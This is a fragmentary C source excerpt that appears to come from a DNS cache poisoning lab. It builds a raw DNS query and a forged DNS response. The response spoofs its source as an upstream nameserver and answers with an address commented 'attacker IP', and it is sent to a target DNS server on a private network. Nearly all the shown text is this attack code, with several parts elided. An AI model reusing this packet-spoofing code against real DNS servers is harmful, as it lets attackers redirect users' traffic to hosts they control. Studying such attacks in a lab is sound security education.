...
int dnsQueryBuilder(char *buffer_query,char *srcAddr, char *dstAddr){
	 ...
	 */
	strcpy(data_query, "\5twysw\7example\3edu");
	 ...
	 */
	udp_query->udph_srcport = htons(33333);  // source port number; random because the lower number may be reserved
...
int dnsResponseBuilder(char *buffer_response, char *srcAddr, char *dstAddr){
	...
	//query string
	strcpy(data_response,"\5twysw\7example\3edu");
	...
	*(unsigned int*)writingPointer=inet_addr("192.168.15.6"); //attacker IP 
	writingPointer+=4;
	/////////////////////////////////////////////
	// answer section end
	////////////////////////////////////////////
...
int main(int argc, char *argv[]){
	...
	int packetLength_query = dnsQueryBuilder(buffer_query, "192.168.15.6", "192.168.15.4");
	int packetLength_response = dnsResponseBuilder(buffer_response, "199.43.133.53", "192.168.15.4");
	...
	sin.sin_addr.s_addr = inet_addr("192.168.15.4"); //DNS Server ip
	din.sin_addr.s_addr = inet_addr("199.43.133.53"); // query source IP
